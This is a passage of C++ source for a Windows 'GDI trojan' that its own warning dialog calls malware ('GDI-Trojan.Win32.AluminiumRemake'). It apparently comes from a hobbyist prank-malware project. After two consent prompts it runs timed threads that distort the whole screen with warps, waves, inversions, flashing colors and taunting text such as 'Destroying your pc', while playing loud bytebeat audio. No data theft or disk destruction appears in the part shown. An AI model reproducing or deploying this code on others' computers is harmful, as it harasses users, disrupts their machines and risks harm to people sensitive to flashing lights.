		HDC dcCopy = CreateCompatibleDC(dc);

		LOGFONTW lFont = { 0 };

		//Setup our font style
		lFont.lfWidth = 20;
		lFont.lfHeight = 50;
		lFont.lfOrientation = 400;
		lFont.lfWeight = 800;
		lFont.lfUnderline = TRUE;
		lFont.lfQuality = DRAFT_QUALITY;
		lFont.lfPitchAndFamily = DEFAULT_PITCH | FF_ROMAN;

		lstrcpy(lFont.lfFaceName, L"Comic Sans MS");

		while (true)
		{
			dc = GetDC(NULL);
			if (rand() % 25 == 24)
			{
				LPCSTR lpStrings[] =
				{
					"LMAO", "Don't put in microwave", "Microwave explodings",
					"Loud bottles in school", "Metal", "Aluminium paper",
					"Aluminium hats", "FBI?", "Aliens?", "Ghosts?",
					"OH SHIT", "you put", "oh", "Destroying your pc", "AAAAAAA",
					"doge", "skid", "SHIT CODE",
					"questioning my existence", "BURN", "your little piece of shit",
					"THE END IS NEAR", ":3", ":O",
					"Label", "qwerty", "I WANT TO MAKE POOP, POOP AND POOP", "shit source",
					"THIS CODE IS A SHIT", "SKIDDED", "beyond the stars", "A",
					"I can't pee", "One last time", "Six", "MAMAAA",
					"Goodbye Windows :)", "Goodbye computer", "Goodbye System", "YEA BOI"
				};
				lFont.lfEscapement = rand() % 60;
				HFONT hFont = CreateFontIndirectW(&lFont);
				SelectObject(dc, hFont);

				SetTextColor(dc, RGB(rand() % 255, rand() % 255, rand() % 255));
				SetBkColor(dc, RGB(rand() % 2, rand() % 2, rand() % 2));
				int index = rand() % 40;

				TextOutA(dc, rand() % w, rand() % h, lpStrings[index], lstrlenA(lpStrings[index]));

				if (rand() % 25 == 24)
				{
					if (rand() % 2 == 0)
					{
						BitBlt(dc, 1, 0, w, h, dc, 0, 1, !(rand() % 2) ? 0x999999 : SRCAND);
					}
					else
					{
						BitBlt(dc, 1, 0, w, h, dc, 0, 1, !(rand() % 2) ? SRCINVERT : SRCPAINT);
					}
				}

				Sleep(rand() % 5);

				if (rand() % 25 == 24)
				{
					System::RedrawScreen();
				}
			}
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	DWORD WINAPI warp(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);
		float warpIntensity = 3;

		while (1)
		{
			dc = GetDC(NULL);
			for (int i = 1; i <= warpIntensity; i++)
			{
				int size = rand() % 400;

				int wsrc = rand() % w;
				int hsrc = rand() % h;

				BitBlt(dc, wsrc - rand() % i, hsrc - rand() % i, size, size, dc, wsrc, hsrc, SRCCOPY);
			}

			Sleep(rand() % 2);

			if (rand() % 25 == 24) System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//Rotating DDT+ similar cube
	DWORD WINAPI cube(LPVOID lpvd)
	{
		ShowWindow(GetConsoleWindow(), SW_HIDE);

		int sw = GetSystemMetrics(SM_CXSCREEN);
		int sh = GetSystemMetrics(SM_CYSCREEN);

		float posX = (float)(rand() % (sw - 200));
		float posY = (float)(rand() % (sh - 200));
		float velX = 5.0f;
		float velY = 3.0f;

		float angleX = 0, angleY = 0, angleZ = 0;

		Point3D vertices[8] = {
			{-SIZE, -SIZE,  SIZE}, {SIZE, -SIZE,  SIZE}, {SIZE,  SIZE,  SIZE}, {-SIZE,  SIZE,  SIZE},
			{-SIZE, -SIZE, -SIZE}, {SIZE, -SIZE, -SIZE}, {SIZE,  SIZE, -SIZE}, {-SIZE,  SIZE, -SIZE}
		};

		// FACES
		int faces[6][4] = {
			{0, 1, 2, 3}, {1, 5, 6, 2}, {5, 4, 7, 6}, {4, 0, 3, 7}, {3, 2, 6, 7}, {4, 5, 1, 0}
		};

		while (true) {
			HDC hdc = GetDC(NULL);
			HDC hdcMem = CreateCompatibleDC(hdc);
			HBITMAP hbm = CreateCompatibleBitmap(hdc, sw, sh);
			SelectObject(hdcMem, hbm);

			BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);

			// POSITION
			posX += velX; posY += velY;
			if (posX <= 150 || posX + 150 >= sw) velX *= -1;
			if (posY <= 150 || posY + 150 >= sh) velY *= -1;

			angleX += 0.05f; angleY += 0.03f; angleZ += 0.02f;

			std::vector<Point2D> projected(8);

			// ROTATING
			for (int i = 0; i < 8; i++) {
				float x = vertices[i].x;
				float y = vertices[i].y;
				float z = vertices[i].z;

				// ROTATING X
				float ny = y * cos(angleX) - z * sin(angleX);
				float nz = y * sin(angleX) + z * cos(angleX);
				y = ny; z = nz;

				// ROTATING Y
				float nx = x * cos(angleY) + z * sin(angleY);
				nz = -x * sin(angleY) + z * cos(angleY);
				x = nx; z = nz;

				// PERSPECTIVE
				float dist = 400.0f;
				float factor = dist / (dist + z);
				projected[i].x = (int)(x * factor + posX);
				projected[i].y = (int)(y * factor + posY);
			}

			// DRAW FACES
			for (int i = 0; i < 6; i++) {
				POINT p[4] = {
					{projected[faces[i][0]].x, projected[faces[i][0]].y},
					{projected[faces[i][1]].x, projected[faces[i][1]].y},
					{projected[faces[i][2]].x, projected[faces[i][2]].y},
					{projected[faces[i][3]].x, projected[faces[i][3]].y}
				};

				// SHADOWS
				HBRUSH brush = CreateSolidBrush(RGB(100 + (i * 20), 100 + (i * 20), 100 + (i * 20)));
				SelectObject(hdcMem, brush);
				SelectObject(hdcMem, GetStockObject(BLACK_PEN));

				// DRAW
				Polygon(hdcMem, p, 4);

				DeleteObject(brush);
			}

			BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);

			DeleteObject(hbm);
			DeleteDC(hdcMem);
			ReleaseDC(NULL, hdc);

			Sleep(16); // 60 FPS
		}
		return 0;
	}

	//Random HSV Ellipses
	DWORD WINAPI ellipses(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;

		//semi-major axis and semi-minor axis
		FLOAT a = 5.0;
		FLOAT b = 3.0;

		SetStretchBltMode(dc, COLORONCOLOR);
		SetStretchBltMode(dcCopy, COLORONCOLOR);

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			//Set a random (x,y) pos
			int randx = rand() % ws;
			int randy = rand() % hs;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int cx = x - randx;
					int cy = y - randy;

					//(x²/a²) + (y²+b²) = 1
					int zx = (cx * cx) / (a * a);
					int zy = (cy * cy) / (b * b);

					//Plasma it
					int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));

					//Convert the screen colors to HSV
					HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

					//Apply the effect from fx+i [0,360]
					hsv.h = fmod(fx + i, 360.0);

					//Return the HSV back to RGB and show it
					rgbquad[index] = Colors::HSVtoRGB(hsv);
				}
			}

			i++;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 1000);
			System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//Custom Waves
	DWORD WINAPI waves(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);

		int i = 0;

		while (true)
		{
			dc = GetDC(NULL);
			int waveAmplitude = rand() % 3;
			int wavePhase = rand() % 20;

			if (rand() % 25 == 0)
			{
				for (int y = 0; y < h; y++)
				{
					int zx = Math::SineWave(waveAmplitude, y + i * 4, wavePhase, h);

					BitBlt(dc, 0, y, w - zx, 1, dc, zx, y, SRCCOPY);
				}

				Sleep(1);

				if (rand() % 25 == 0) System::RedrawScreen();

				i++;
			}
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//High Frequency Waves
	DWORD WINAPI high(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);

		int i = 0;

		while (true)
		{
			dc = GetDC(NULL);
			for (int y = 0; y < h; y++)
			{
				int wavePhase = rand() % 70 - 40;

				int zx = Math::SineWave(5, y + i * 4, wavePhase, h);

				BitBlt(dc, 0, y, w + zx, 1, dc, zx, y, SRCCOPY);
			}

			Sleep(waveDelay);

			i++;
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//Center Circle (to put with tesseract)
	DWORD WINAPI center(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 32;

		SetStretchBltMode(dc, COLORONCOLOR);
		SetStretchBltMode(dcCopy, COLORONCOLOR);

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int cx = x - (ws / 2);
					int cy = y - (hs / 2);

					int zx = (cx * cx);
					int zy = (cy * cy);

					int di = 128.0 + i;

					int fx = di + (di * sin(sqrt(zx + zy) / 32.0));

					HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

					hsv.h = fmod(fx + i, 360.0);

					rgbquad[index] = Colors::HSVtoRGB(hsv);
				}
			}

			i++;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 1000);
			System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//HSV Random Inverted Colors
	DWORD WINAPI colors(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 1;
		int hs = h / 1;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;

		SetStretchBltMode(dc, COLORONCOLOR);
		SetStretchBltMode(dcCopy, COLORONCOLOR);

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			int color = rand() % 360;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					HSV hsv = Colors::RGBtoHSV(rgbquad[index]);

					hsv.h = fmod(color, 360.0);

					rgbquad[index] = Colors::HSVtoRGB(hsv);
				}
			}

			i++;

			Sleep(rand() % 1000);

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
			StretchBlt(dc, 0, 0, w, h, dc, 0, 0, w, h, NOTSRCCOPY);

			Sleep(colorsdelay);
			System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//Normal And Generic Screen Blur
	DWORD WINAPI blur(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, bmp);

		BLENDFUNCTION blur = { 0 };

		blur.BlendOp = AC_SRC_OVER;
		blur.BlendFlags = 0;
		blur.AlphaFormat = 0;
		blur.SourceConstantAlpha = 10;

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, rand() % 10, rand() % 10, w, h, dc, rand() % -10, rand() % -10, w, h, SRCCOPY);

			AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, blur);

			if (rand() % 10 == 0)
			{
				Sleep(5);

				System::RedrawScreen();
			}
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//Generic Bit Colors
	DWORD WINAPI bit(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		SetStretchBltMode(dc, COLORONCOLOR);
		SetStretchBltMode(dcCopy, COLORONCOLOR);

		int color = 0;

		bool statementA = true;
		bool statementB = true;

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			int r = rand() % 255;
			int g = rand() % 255;
			int b = rand() % 255;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int noise = rand() % 255;

					noise %= (r * g * b + 1) % (color + 1) + 1;

					rgbquad[index].rgbRed += noise + r;
					rgbquad[index].rgbGreen += noise + g;
					rgbquad[index].rgbBlue += noise + b;
				}
			}

			if (statementA)
			{
				color++;

				if (color > 0xAA)
				{
					statementA = false;
					statementB = true;
				}
			}

			if (statementB)
			{
				color--;

				if (color == 0)
				{
					statementA = true;
					statementB = false;
				}
			}

			Sleep(rand() % 500);

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(50);
			System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//SRCPAINT Strips
	DWORD WINAPI strips(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		HBITMAP hbmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, hbmp);

		INT x = 0; INT y = 0;

		while (true)
		{
			dc = GetDC(NULL);
			DWORD rop = SRCAND;

			int dx0 = rand() % 20;
			int dx1 = x;

			int dy0 = y;
			int dy1 = rand() % 20;

			int size = 20;

			//Y DISPLACEMENT
			if (rand() % 2 == 0) BitBlt(dc, -dx0, dy0, w, size, dc, dx0, dy0, rop);
			if (rand() % 2 == 0) BitBlt(dc, dx0, dy0, w, size, dc, -dx0, dy0, rop);

			//X DISPLACEMENT
			if (rand() % 2 == 0) BitBlt(dc, dx1, dy1, size, h, dc, dx1, -dy1, rop);
			if (rand() % 2 == 0) BitBlt(dc, dx1, -dy1, size, h, dc, dx1, dy1, rop);

			x += size;
			y += size;

			if (x > w)
			{
				x = 0;

				Sleep(25);
				if (rand() % 5 == 0) System::RedrawScreen();
			}
			if (y > h)
			{
				y = 0;
			}
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//Kaleidoscope + Screen Scroller
	DWORD WINAPI kaleidoscope(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		DWORD rop = SRCCOPY;

		bool statementA = true;
		bool statementB = false;

		int scrollX, scrollY;

		int cw = w / 2;
		int ch = h / 2;

		int limit = 25;

		int i = 0;

		while (1)
		{
			//Put right on left and reflect it with lateral shift
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, w, h, dc, w, 0, -cw, h, rop);
			StretchBlt(dc, 0, 0, cw, h, dcCopy, 0, 0, w, h, rop);

			System::RedrawScreen();

			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, h, rop);

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;

					int dx = 10;

					//First scroll
					if (statementA)
					{
						scrollX = (x + dx) % w;
						scrollY = (y + dx) % h;
					}

					//Second scroll
					else if (statementB)
					{
						scrollX = (x + dx) % w;
						scrollY = abs(y - dx) % h;
					}

					int srcIndex = scrollY * w + scrollX;

					rgbquad[index] = rgbquad[srcIndex];
				}
			}

			if (statementA)
			{
				i++;

				if (i > limit)
				{
					statementA = false;
					statementB = true;

					System::RedrawScreen();
				}
			}

			else if (statementB)
			{
				i--;

				if (i < 0)
				{
					statementA = true;
					statementB = true;

					System::RedrawScreen();
				}
			}

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, rop);

			//Put top on bottom and reflect it with lateral shift
			StretchBlt(dcCopy, 0, 0, w, h, dc, 0, 0, w, ch, rop);
			StretchBlt(dc, 0, ch, w, ch, dcCopy, 0, h, w, -h, rop);

			Sleep(20);
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//Warning icons sierspinski triangle
	DWORD WINAPI palette(LPVOID lpvd)
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);

		HDC hdc = GetDC(NULL);
		HICON hIcon = LoadIcon(NULL, IDI_EXCLAMATION);

		POINT v[3];
		v[0] = { w / 2, 50 };
		v[1] = { 50, h - 50 };
		v[2] = { w - 50, h - 50 };

		int curX = v[0].x;
		int curY = v[0].y;

		while (true) {
			int target = rand() % 3;

			curX = (curX + v[target].x) / 2;
			curY = (curY + v[target].y) / 2;

			DrawIcon(hdc, curX - 16, curY - 16, hIcon);

			Sleep(1);

			static int count = 0;
			if (++count > 10000) {
				InvalidateRect(NULL, NULL, TRUE);
				count = 0;
				v[0].x = rand() % w; v[0].y = rand() % h;
				v[1].x = rand() % w; v[1].y = rand() % h;
				v[2].x = rand() % w; v[2].y = rand() % h;
			}
		}

		ReleaseDC(NULL, hdc);
		return 0;
	}

	//Rainbow Noise
	DWORD WINAPI final(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = w;
		bmpi.bmiHeader.biHeight = h;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		int color = 0;

		bool statementA = true;
		bool statementB = true;

		while (1)
		{
			dc = GetDC(NULL);
			SetStretchBltMode(dc, COLORONCOLOR);
			SetStretchBltMode(dcCopy, COLORONCOLOR);

			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, h, w, 0, SRCCOPY);

			int r = rand() % 255;
			int g = rand() % 255;
			int b = rand() % 255;

			for (int x = 0; x < w; x++)
			{
				for (int y = 0; y < h; y++)
				{
					int index = y * w + x;

					int noise = rand() % 255;

					noise %= (r * g * b + 1) % (color + 1) + 1;

					rgbquad[index].rgbRed = noise + r;
					rgbquad[index].rgbGreen = noise + g;
					rgbquad[index].rgbBlue = noise + b;
				}
			}

			if (statementA)
			{
				color++;

				if (color > 0xAA)
				{
					statementA = false;
					statementB = true;
				}
			}

			if (statementB)
			{
				color--;

				if (color == 0)
				{
					statementA = true;
					statementB = false;
				}
			}

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
			ReleaseDC(0, dc);
		}

		return 0x00;
	}
}

INT WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdline, int nCmdShow)
{
	if (MessageBoxW(NULL, L"WARNING!!!\r\nThis program also displays flashing lights and plays loud sounds.\r\nBy running this program, you accept full responsibility for any damages.\r\nThe creators (OsJanelas) will not be responsible for anything caused by this software. Credits for BelkasPro and N17Pro3426, original creators of Aluminium. This malware is made by the original version is a skid of Purgatorium.exe, they gived credits for ArTicZera\r\nYou downloaded safety version!\r\nWould you like to proceed with running this program?", L"'New cannot be forgotten Aluminium will get worse in the future'", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"FINAL WARNING!!!\r\nIf you press 'Yes', you accepted the rules from 1st message.\r\nIf you press 'No', you don't accepting the rules from the 1st message and closing this application.", L"GDI-Trojan.Win32.AluminiumRemake - FINAL WARNING!", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			Sleep(2000);
			HANDLE hBB0 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
			HANDLE hBytebeat0 = CreateThread(NULL, NULL, &Bytebeats::sound1, hBB0, NULL, NULL);
			Sleep(10000);
			HANDLE hBB1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
			HANDLE hBytebeat1 = CreateThread(NULL, NULL, &Bytebeats::alpha, hBB1, NULL, NULL);
			Sleep(20000);
			HANDLE hPML1 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload1 = CreateThread(NULL, NULL, &GDIPayloads::blur, hPML1, NULL, NULL);
			Sleep(20000);
			HANDLE hPML2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload2 = CreateThread(NULL, NULL, &GDIPayloads::shake, hPML2, NULL, NULL);
			Sleep(15000);
			HANDLE hPML3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload3 = CreateThread(NULL, NULL, &GDIPayloads::colors, hPML3, NULL, NULL);
			Sleep(15000);
			HANDLE hBB2 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
			HANDLE hBytebeat2 = CreateThread(NULL, NULL, &Bytebeats::beta, hBB2, NULL, NULL);
			HANDLE hPML4 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload4 = CreateThread(NULL, NULL, &GDIPayloads::waves, hPML4, NULL, NULL);
			Sleep(15000);
			HANDLE hPML5 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload5 = CreateThread(NULL, NULL, &GDIPayloads::texts, hPML5, NULL, NULL);
			Sleep(15000);
			HANDLE hPML6 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload6 = CreateThread(NULL, NULL, &GDIPayloads::warp, hPML6, NULL, NULL);
			Sleep(15000);
			HANDLE hPML7 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload7 = CreateThread(NULL, NULL, &GDIPayloads::blur, hPML7, NULL, NULL);
			Sleep(15000);
			HANDLE hPML8 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload8 = CreateThread(NULL, NULL, &GDIPayloads::bit, hPML8, NULL, NULL);
			Sleep(15000);
			shakeIntensity = 5;
			HANDLE hBB3 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64 * 2, 0);
			HANDLE hBytebeat3 = CreateThread(NULL, NULL, &Bytebeats::gamma, hBB3, NULL, NULL);
			HANDLE hPML9 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload9 = CreateThread(NULL, NULL, &GDIPayloads::overdose, hPML9, NULL, NULL);
			Sleep(15000);
			System::EndPayload(hBytebeat0, hBB0);
			System::EndPayload(hBytebeat2, hBB2);
			System::EndPayload(hBytebeat3, hBB3);
			System::EndPayload(hPayload1, hPML1);
			System::EndPayload(hPayload2, hPML2);
			System::EndPayload(hPayload3, hPML3);
			System::EndPayload(hPayload4, hPML4);
			System::EndPayload(hPayload5, hPML5);
			System::EndPayload(hPayload6, hPML6);
			System::EndPayload(hPayload7, hPML7);
			System::EndPayload(hPayload8, hPML8);
			System::EndPayload(hPayload9, hPML9);
			HANDLE hBBA = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hBytebeatA = CreateThread(NULL, NULL, &Bytebeats::soundA, hBBA, NULL, NULL);
			HANDLE hPMLA = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPMLB = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPMLC = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayloadA = CreateThread(NULL, NULL, &GDIPayloads::kaleidoscope, hPMLA, NULL, NULL);
			HANDLE hPayloadB = CreateThread(NULL, NULL, &GDIPayloads::bit, hPMLB, NULL, NULL);
			HANDLE hPayloadC = CreateThread(NULL, NULL, &GDIPayloads::palette, hPMLC, NULL, NULL);
			Sleep(20000);
			System::EndPayload(hBytebeatA, hBBA);
			System::EndPayload(hPayloadA, hPMLA);
			System::EndPayload(hPayloadB, hPMLB);
			System::EndPayload(hPayloadC, hPMLC);
			HANDLE hPML10 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML11 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPML12 = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayload10 = CreateThread(NULL, NULL, &GDIPayloads::cube, hPML10, NULL, NULL);
			HANDLE hPayload11 = CreateThread(NULL, NULL, &GDIPayloads::high, hPML11, NULL, NULL);
			HANDLE hPayload12 = CreateThread(NULL, NULL, &GDIPayloads::center, hPML12, NULL, NULL);
			HANDLE hBBB = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hBytebeatB = CreateThread(NULL, NULL, &Bytebeats::soundB, hBBB, NULL, NULL);
			HANDLE hPayload28 = CreateThread(NULL, NULL, &Payloads::bouncing, hBBB, NULL, NULL);
			Sleep(30000);
			System::EndPayload(hPayload11, hPML11);
			System::EndPayload(hPayload12, hPML12);
			System::EndPayload(hPayload28, hPML12);
			System::EndPayload(hBytebeatB, hBBB);
			colorsdelay = 100;
			HANDLE hBBC = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hBytebeatC = CreateThread(NULL, NULL, &Bytebeats::soundC, hBBC, NULL, NULL);
			HANDLE hPMLD = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPMLE = HeapCreate(HEAP_NO_SERIALIZE | HEAP_CREATE_ENABLE_EXECUTE, sizeof(char) * 8192 * 64, 0);
			HANDLE hPayloadD = CreateThread(NULL, NULL, &GDIPayloads::strips, hPMLD, NULL, NULL);
			HANDLE hPayloadE = CreateThread(NULL, NULL, &GDIPayloads::colors, hPMLE, NULL, NULL);
			Sleep(20000);
			System::EndPayload(hPayload10, hPML10);
